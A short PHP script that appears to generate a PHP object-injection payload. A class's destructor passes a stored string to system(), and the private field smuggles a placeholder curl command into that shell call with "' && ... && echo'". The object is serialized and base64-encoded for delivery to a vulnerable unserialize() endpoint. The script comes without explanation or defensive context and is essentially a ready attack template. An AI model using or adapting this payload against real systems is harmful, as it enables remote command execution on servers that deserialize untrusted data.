
<?php
class ApiTester {
    public $ip;
    private $res = "' && {custom_curl_command} && echo'";

    public function __construct($ip) {
        $this->ip = $ip;
    }

    public function __invoke() {
        $this->res = system("ping " . $this->ip);
    }

    public function __destruct() {
        system("echo '" . $this->res . "' > C:/logs/test.log");
    }
}
$api = new ApiTester('127.0.0.1');
$payload = base64_encode(serialize($api));
echo $payload;
